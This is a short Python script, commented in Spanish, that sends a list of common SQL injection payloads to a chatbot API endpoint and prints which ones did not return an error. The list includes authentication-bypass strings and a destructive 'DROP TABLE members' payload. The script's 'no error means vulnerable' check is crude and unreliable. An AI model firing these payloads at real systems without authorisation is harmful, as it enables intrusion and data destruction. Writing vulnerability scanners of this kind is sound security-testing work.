import requests
import re

def test_sql_injection_advanced(base_url, chat_endpoint):
    # Diferentes tipos de payloads SQLi
    payloads = [
        "' OR '1'='1",
        "' OR '1'='2",
        "'; DROP TABLE members; --",
        "' OR 'x'='x",
        "' OR 1=1 --",
        "admin' --",
        "admin' /*",
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "admin' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1--",
        "') OR ('1'='1#",
        "') OR ('1'='1/*",
        "' OR 1=1) --",
        "' OR 1=1) #",
        "' OR 1=1) /*",
        "' OR 'a'='a",
        '" OR "a"="a'
    ]
    
    vulnerable = False
    
    for payload in payloads:
        # Enviar el payload al endpoint del chatbot
        response = requests.post(base_url + chat_endpoint, data={'message': payload})
        content = response.content.decode('utf-8')
        
        # Buscar indicios de una inyecci√≥n SQL exitosa
        if "error" not in content.lower():
            print(f"Potentially vulnerable to SQL Injection: {payload}")
            vulnerable = True
            
    if not vulnerable:
        print("No potential SQL Injection vulnerabilities detected.")

# Ejemplo de uso
# base_url = "http://example.com"
# chat_endpoint = "/api/chat"
# test_sql_injection_advanced(base_url, chat_endpoint)
